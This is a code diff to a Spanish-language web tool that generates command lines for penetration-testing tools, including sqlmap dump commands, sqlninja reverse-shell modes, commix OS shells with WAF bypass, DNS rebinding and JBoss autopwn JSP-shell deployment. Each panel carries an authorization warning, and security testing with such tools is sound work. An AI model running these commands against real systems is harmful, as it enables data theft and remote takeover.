@@ -1,6 +1,6 @@
 /**
  * MFH TOOLS - Script del apartado Herramientas de Ciberseguridad
- * Categorías: Reconocimiento | Acceso con Credenciales | NFC | Kerberoasting
+ * Categorías: Reconocimiento | Acceso con Credenciales | Acceso Inicial
  */
 
 'use strict';
@@ -107,7 +107,15 @@ function showTool(tool) {
         libnfc: 'libnfcTab',
         nfcmfclassic: 'nfcmfclassicTab',
         kerberoast: 'kerberoastTab',
-        krbrelayx: 'krbrelayxTab'
+        krbrelayx: 'krbrelayxTab',
+        dnsrebind: 'dnsrebindTab',
+        sqlmap: 'sqlmapTab',
+        sqlninja: 'sqlninjaTab',
+        sqlsus: 'sqlsusTab',
+        jsqlinjection: 'jsqlinjectionTab',
+        commix: 'commixTab',
+        jbosswin: 'jbosswinTab',
+        jbossautopwn: 'jbossautopwnTab'
     };
     var tabId = tabMap[tool];
     if (!tabId) return;
@@ -145,7 +153,15 @@ var AVAILABLE_TOOLS = [
     'libnfc.js',
     'nfc-mfclassic.js',
     'kerberoast.js',
-    'krbrelayx.js'
+    'krbrelayx.js',
+    'dns-rebind.js',
+    'sqlmap.js',
+    'sqlninja.js',
+    'sqlsus.js',
+    'jsql-injection.js',
+    'commix.js',
+    'jboss-linux.js',
+    'jboss-autopwn.js'
 ];
 
 function downloadTool(filename) {
@@ -1170,6 +1186,365 @@ function runKrbRelayX() {
 }
 
 // ============================================================
+// DNS REBIND
+// ============================================================
+function runDnsRebind() {
+    var iface = ($('dnsrebindIface') ? $('dnsrebindIface').value : '').trim() || 'eth0';
+    var domain = ($('dnsrebindDomain') ? $('dnsrebindDomain').value : '').trim() || 'kali.local';
+    var targets = ($('dnsrebindTargets') ? $('dnsrebindTargets').value : '').trim() || '';
+    setOutput('dnsrebindResult', '🔄 Generando comandos DNS Rebind...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  🔄 DNS REBIND');
+        lines.push('  Interface: ' + esc(iface));
+        lines.push('  Dominio: ' + esc(domain));
+        if (targets) lines.push('  Targets: ' + esc(targets));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 rebind');
+        lines.push('   Instalar: sudo apt install rebind');
+        lines.push('');
+        lines.push('🔧 Comando basico:');
+        lines.push(codeBlock('rebind -i ' + iface + ' -d ' + domain));
+        if (targets) {
+            lines.push('🔧 Con targets especificos:');
+            lines.push(codeBlock('rebind -i ' + iface + ' -d ' + domain + ' -t ' + targets));
+        }
+        lines.push('');
+        lines.push('🔧 Opciones utiles:');
+        lines.push('   -u <user>      Basic Auth user [admin]');
+        lines.push('   -a <pass>      Basic Auth password [admin]');
+        lines.push('   -p <port>      Puerto target [80]');
+        lines.push('   -c <port>      Puerto callback [81]');
+        lines.push('   -n <time>      Intervalo callback (ms) [2000]');
+        lines.push('');
+        lines.push('📌 dns-rebind (alias)');
+        lines.push(codeBlock('dns-rebind -h'));
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • Requiere dominio registrado apuntando a tu IP');
+        lines.push('   • Ataca routers con weak end system model');
+        lines.push('   • Abre DNS (53), Web (80) y Callback (81)');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca redes con autorizacion escrita');
+        setOutput('dnsrebindResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// SQLMAP
+// ============================================================
+function runSqlmap() {
+    var target = ($('sqlmapTarget') ? $('sqlmapTarget').value : '').trim();
+    var data = ($('sqlmapData') ? $('sqlmapData').value : '').trim();
+    var cookie = ($('sqlmapCookie') ? $('sqlmapCookie').value : '').trim();
+    if (!target) { setOutput('sqlmapResult', '❌ Ingresa una URL'); return; }
+    setOutput('sqlmapResult', '💉 Generando comandos SQLMap...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  💉 SQLMAP');
+        lines.push('  Target: ' + esc(target));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 SQLMap');
+        lines.push('   Instalar: sudo apt install sqlmap');
+        lines.push('');
+        lines.push('🔧 Deteccion basica:');
+        var cmd = 'sqlmap -u "' + target + '" --batch';
+        if (data) cmd += ' --data="' + data + '"';
+        if (cookie) cmd += ' --cookie="' + cookie + '"';
+        lines.push(codeBlock(cmd));
+        lines.push('');
+        lines.push('🔧 Enumerar bases de datos:');
+        lines.push(codeBlock(cmd + ' --dbs'));
+        lines.push('');
+        lines.push('🔧 Enumerar tablas de una DB:');
+        lines.push(codeBlock(cmd + ' -D <dbname> --tables'));
+        lines.push('');
+        lines.push('🔧 Dump de datos:');
+        lines.push(codeBlock(cmd + ' -D <dbname> -T <table> --dump'));
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • Requiere autorizacion escrita para usar en produccion');
+        lines.push('   • Usar con Burp Suite o proxy para inspeccionar');
+        lines.push('   • --level=5 --risk=3 para pruebas exhaustivas');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca sistemas con autorizacion escrita');
+        setOutput('sqlmapResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// SQLNINJA
+// ============================================================
+function runSqlninja() {
+    var target = ($('sqlninjaTarget') ? $('sqlninjaTarget').value : '').trim() || '192.168.1.51:80';
+    var mode = ($('sqlninjaMode') ? $('sqlninjaMode').value : 't');
+    var config = ($('sqlninjaConfig') ? $('sqlninjaConfig').value : '').trim() || 'sqlninja.conf';
+    setOutput('sqlninjaResult', '🥷 Generando comandos SQLNinja...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  🥷 SQLNINJA');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Modo: ' + esc(mode));
+        lines.push('  Config: ' + esc(config));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 sqlninja');
+        lines.push('   Instalar: sudo apt install sqlninja');
+        lines.push('');
+        lines.push('🔧 Comando generado:');
+        lines.push(codeBlock('sqlninja -m ' + mode + ' -f ' + config));
+        lines.push('');
+        lines.push('🔧 Modos disponibles:');
+        lines.push('   t/test        Probar si la inyeccion funciona');
+        lines.push('   f/fingerprint Fingerprint user, xp_cmdshell');
+        lines.push('   b/bruteforce  Bruteforce cuenta sa');
+        lines.push('   e/escalation  Agregar user a sysadmin');
+        lines.push('   x/resurrectxp Recrear xp_cmdshell');
+        lines.push('   u/upload      Subir .scr file');
+        lines.push('   s/dirshell    Shell directo');
+        lines.push('   r/revshell    Reverse shell');
+        lines.push('   d/dnstunnel   Tunel DNS');
+        lines.push('   m/metasploit  Wrapper a MSF');
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • Especializado en Microsoft SQL Server');
+        lines.push('   • La configuracion se hace en sqlninja.conf');
+        lines.push('   • Usa Burp Suite para capturar el request HTTP');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca sistemas con autorizacion escrita');
+        setOutput('sqlninjaResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// SQLSUS
+// ============================================================
+function runSqlsus() {
+    var target = ($('sqlsusTarget') ? $('sqlsusTarget').value : '').trim() || 'http://ejemplo.com/page.php?id=1';
+    var config = ($('sqlsusConfig') ? $('sqlsusConfig').value : '').trim() || 'target.cfg';
+    var cmd = ($('sqlsusCmd') ? $('sqlsusCmd').value : '').trim();
+    setOutput('sqlsusResult', '🐬 Generando comandos SQLSus...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  🐬 SQLSUS');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Config: ' + esc(config));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 sqlsus');
+        lines.push('   Instalar: sudo apt install sqlsus');
+        lines.push('');
+        lines.push('🔧 Paso 1: Generar configuracion:');
+        lines.push(codeBlock('sqlsus --genconf ' + config));
+        lines.push('');
+        lines.push('🔧 Paso 2: Editar configuracion:');
+        lines.push('   # Editar ' + config + ' con target y parametros de inyeccion');
+        lines.push('');
+        lines.push('🔧 Paso 3: Ejecutar:');
+        if (cmd) {
+            lines.push(codeBlock('sqlsus ' + config + ' -e \'' + cmd + '\''));
+        } else {
+            lines.push(codeBlock('sqlsus ' + config));
+            lines.push('   # Luego dentro del shell interactivo:');
+            lines.push('   start');
+            lines.push('   get tables');
+            lines.push('   get columns');
+            lines.push('   clone');
+        }
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • Especializado en MySQL');
+        lines.push('   • Usa SQLite como backend');
+        lines.push('   • Inline help: escribe "help" en el shell');
+        lines.push('   • Usa Ctrl-C para romper comandos largos');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca sistemas con autorizacion escrita');
+        setOutput('sqlsusResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// jSQL Injection
+// ============================================================
+function runJsqlInjection() {
+    var target = ($('jsqlTarget') ? $('jsqlTarget').value : '').trim() || 'http://target.com/item.php?id=1';
+    var data = ($('jsqlData') ? $('jsqlData').value : '').trim();
+    var headless = ($('jsqlHeadless') ? $('jsqlHeadless').checked : true);
+    setOutput('jsqlResult', '☕ Generando comandos jSQL Injection...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  ☕ JSQL INJECTION');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Headless: ' + (headless ? 'Si' : 'No'));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 jSQL Injection');
+        lines.push('   Instalar: sudo apt install jsql-injection');
+        lines.push('   O: java -jar jsql-injection.jar');
+        lines.push('');
+        if (headless) {
+            lines.push('🔧 Deteccion headless:');
+            var cmd = 'java -jar jsql-injection.jar --url "' + target + '" --headless';
+            if (data) cmd += ' --method=POST --data="' + data + '"';
+            lines.push(codeBlock(cmd));
+            lines.push('');
+            lines.push('🔧 Enumerar databases:');
+            lines.push(codeBlock(cmd + ' --strategy=union'));
+            lines.push('');
+            lines.push('🔧 Dump de tabla:');
+            lines.push(codeBlock(cmd + ' --strategy=union --output=./dump.json'));
+        } else {
+            lines.push('🔧 Modo GUI:');
+            lines.push(codeBlock('jsql-injection'));
+        }
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • Soporta 33 motores de DB');
+        lines.push('   • Estrategias: Normal, Stacked, Error, Blind, Time');
+        lines.push('   • Puede leer/escribir archivos via inyeccion');
+        lines.push('   • Busca admin pages automaticamente');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca sistemas con autorizacion escrita');
+        setOutput('jsqlResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// COMMIX
+// ============================================================
+function runCommix() {
+    var target = ($('commixTarget') ? $('commixTarget').value : '').trim() || 'http://target.com/ping?ip=127.0.0.1';
+    var data = ($('commixData') ? $('commixData').value : '').trim();
+    var level = ($('commixLevel') ? $('commixLevel').value : '1');
+    setOutput('commixResult', '💻 Generando comandos Commix...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  💻 COMMIX');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Level: ' + esc(level));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 Commix');
+        lines.push('   Instalar: sudo apt install commix');
+        lines.push('');
+        lines.push('🔧 Deteccion basica:');
+        var cmd = 'commix --url="' + target + '"';
+        if (data) cmd += ' --data="' + data + '"';
+        lines.push(codeBlock(cmd));
+        lines.push('');
+        lines.push('🔧 Con nivel especifico:');
+        lines.push(codeBlock(cmd + ' --level=' + level));
+        lines.push('');
+        lines.push('🔧 OS shell interactivo:');
+        lines.push(codeBlock(cmd + ' --os-shell'));
+        lines.push('');
+        lines.push('🔧 Ejecutar comando unico:');
+        lines.push(codeBlock(cmd + ' --os-cmd="whoami"'));
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • Detecta command injection en GET, POST, headers');
+        lines.push('   • Tecnicas: classic, timebased, file-based, semi-blind');
+        lines.push('   • Usa --tamper para bypass de WAF');
+        lines.push('   • -r request.txt para usar request de Burp');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca sistemas con autorizacion escrita');
+        setOutput('commixResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// JBOSS LINUX
+// ============================================================
+function runJbossLinux() {
+    var target = ($('jbosswinTarget') ? $('jbosswinTarget').value : '').trim() || '192.168.1.200';
+    var port = ($('jbosswinPort') ? $('jbosswinPort').value : '').trim() || '8080';
+    setOutput('jbosswinResult', '📦 Generando comandos JBoss Linux...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  📦 JBOSS LINUX');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Puerto: ' + esc(port));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 jboss-autopwn');
+        lines.push('   Instalar: sudo apt install jboss-autopwn');
+        lines.push('');
+        lines.push('🔧 Comando (jboss-linux):');
+        lines.push(codeBlock('jboss-linux ' + target + ' ' + port + ' 2> /dev/null'));
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • Deploya JSP shell en servidor JBoss AS');
+        lines.push('   • Dependencias: curl, metasploit-framework');
+        lines.push('   • Redirige stderr con 2> /dev/null');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca sistemas con autorizacion escrita');
+        setOutput('jbosswinResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// JBOSS AUTOPWN
+// ============================================================
+function runJbossAutopwn() {
+    var target = ($('jbossTarget') ? $('jbossTarget').value : '').trim() || '192.168.1.200';
+    var port = ($('jbossPort') ? $('jbossPort').value : '').trim() || '8080';
+    var os = ($('jbossOs') ? $('jbossOs').value : 'linux');
+    setOutput('jbossResult', '💣 Generando comandos JBoss AutoPwn...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push('═'.repeat(50));
+        lines.push('  💣 JBOSS AUTOPWN');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Puerto: ' + esc(port));
+        lines.push('  OS: ' + esc(os));
+        lines.push('═'.repeat(50));
+        lines.push('');
+        lines.push('📌 jboss-autopwn');
+        lines.push('   Instalar: sudo apt install jboss-autopwn');
+        lines.push('');
+        if (os === 'linux') {
+            lines.push('🔧 Comando (Linux bind/reverse shell):');
+            lines.push(codeBlock('./e.sh ' + target + ' ' + port));
+            lines.push('');
+            lines.push('🔧 Alternativa directa:');
+            lines.push(codeBlock('jboss-linux ' + target + ' ' + port + ' 2> /dev/null'));
+        } else {
+            lines.push('🔧 Comando (Windows payloads):');
+            lines.push(codeBlock('./e2.sh ' + target + ' ' + port));
+            lines.push('');
+            lines.push('🔧 Alternativa directa:');
+            lines.push(codeBlock('jboss-win ' + target + ' ' + port + ' 2> /dev/null'));
+        }
+        lines.push('');
+        lines.push('📝 Notas:');
+        lines.push('   • e.sh para *nix targets (bind_tcp, reverse_tcp)');
+        lines.push('   • e2.sh para Windows targets');
+        lines.push('   • Dependencias: Netcat, Curl, Metasploit');
+        lines.push('   • Deploya JSP shell y permite upload/command execution');
+        lines.push('');
+        lines.push('─'.repeat(50));
+        lines.push('⚠️ Solo ataca sistemas con autorizacion escrita');
+        setOutput('jbossResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
 // EXPORTAR FUNCIONES GLOBALES
 // ============================================================
 window.showTool = showTool;
@@ -1197,6 +1572,14 @@ window.runLibNFC = runLibNFC;
 window.runNfcMfclassic = runNfcMfclassic;
 window.runKerberoast = runKerberoast;
 window.runKrbRelayX = runKrbRelayX;
+window.runDnsRebind = runDnsRebind;
+window.runSqlmap = runSqlmap;
+window.runSqlninja = runSqlninja;
+window.runSqlsus = runSqlsus;
+window.runJsqlInjection = runJsqlInjection;
+window.runCommix = runCommix;
+window.runJbossLinux = runJbossLinux;
+window.runJbossAutopwn = runJbossAutopwn;
 
 // ============================================================
 // INICIALIZACIÓN
@@ -1205,6 +1588,6 @@ document.addEventListener('DOMContentLoaded', function() {
     console.log('✅ MFH TOOLS - script-tools.js cargado correctamente');
     console.log('📦 Herramientas disponibles: ' + AVAILABLE_TOOLS.length);
     console.log('🔍 Reconocimiento: 10 herramientas');
-    console.log('🔐 Acceso con Credenciales: 9 herramientas');
-    console.log('📡 NFC / Kerberoasting: 4 herramientas');
+    console.log('🔐 Acceso con Credenciales: 13 herramientas');
+    console.log('🚪 Acceso Inicial: 8 herramientas');
 });
